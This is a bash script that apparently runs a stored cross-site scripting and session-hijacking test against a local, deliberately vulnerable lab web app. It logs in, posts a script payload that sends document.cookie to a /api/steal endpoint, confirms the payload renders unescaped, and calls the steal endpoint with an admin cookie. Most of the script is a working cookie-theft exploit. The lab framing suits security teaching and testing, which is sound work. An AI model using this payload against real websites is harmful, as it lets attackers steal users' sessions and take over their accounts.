#!/bin/bash

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║         🧪 XSS + SESSION HIJACKING TEST                     ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

echo "📝 Step 1: Login as attacker (user1)"
echo "───────────────────────────────────────────────────────────────"
LOGIN=$(curl -s -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user1","password":"password1"}')
echo $LOGIN | jq
echo ""

echo "📝 Step 2: Post XSS payload"
echo "───────────────────────────────────────────────────────────────"
PAYLOAD='<script>fetch("/api/steal?cookie="+document.cookie)</script>'
COMMENT=$(curl -s -X POST http://localhost:3000/api/comment \
  -H "Content-Type: application/json" \
  -H "Cookie: auth=user1:password1" \
  -d "{\"comment\":\"$PAYLOAD\"}")
echo $COMMENT | jq
echo ""

echo "📝 Step 3: Check if XSS payload is rendered (unescaped)"
echo "───────────────────────────────────────────────────────────────"
curl -s http://localhost:3000/lab/auth -H "Cookie: auth=admin:admin123" | grep "<script>" | head -1
echo ""

echo "📝 Step 4: Test API /api/steal"
echo "───────────────────────────────────────────────────────────────"
curl -s "http://localhost:3000/api/steal?cookie=auth=admin:admin123"
echo ""
echo ""

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║              ✅ XSS VULNERABILITY CONFIRMED!                ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""
echo "💡 Tips:"
echo "  - Check server console for stolen cookies log"
echo "  - XSS payload will execute when anyone views comments"
echo "  - Cookie will be sent to /api/steal endpoint"
